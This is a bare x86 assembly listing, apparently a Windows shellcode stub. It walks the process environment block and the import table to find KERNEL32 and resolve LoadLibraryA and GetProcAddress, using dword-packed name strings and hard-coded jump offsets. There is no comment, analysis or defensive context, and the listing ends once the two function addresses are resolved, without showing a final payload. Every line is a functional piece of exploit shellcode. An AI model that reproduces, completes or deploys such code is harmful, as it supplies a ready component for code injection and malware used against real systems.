
    bits 32
    
    cld
    pushad
    mov ebp, esp
    xor edx, edx
    mov edx, [fs:edx+0x30]
    mov edx, [edx+0x8]
    mov ebx, edx
    add edx, [edx+0x3c]
    mov edi, [edx+0x80]
    add edi, ebx
next_module:    
    mov edx, [edi+0xc]
    add edx, ebx
    cmp dword [edx], 0x4e52454b
    jnz next_thunk
    
    cmp dword [edx+0x4], 0x32334c45
    jz save_edi
next_thunk:    
    add edi, 0x14
    jmp next_module
save_edi:    
    push edi
    jmp 0x76
    
    mov edx, [edi+0x10]
    add edx, ebx
    mov esi, [edi]
    add esi, ebx
    mov ecx, edx
    add ecx, 0xff0000
    xor ebp, ebp
    mov eax, [esi]
    add eax, ebx
    add eax, 0x2
    cmp ecx, eax
    jb 0x6e
    cmp eax, edx
    jb 0x6e
    mov edi, [ds:esp+0x4]
    cmp [eax], edi
    jnz 0x6e
    mov edi, [ds:esp+0x8]
    cmp [eax+0x8], edi
    jnz 0x6e
    ret
    add ebp, 0x4
    add esi, 0x4
    jmp 0x4b
    push 0x41797261
    push 0x64616f4c
    call 0x38
    add edx, ebp
    add esp, 0x8
    pop edi
    push edx
    push 0x65726464
    push 0x50746547
    call 0x38
    add edx, ebp
    pop ebp
    pop ebp
    pop ebx
    mov ebp, edx
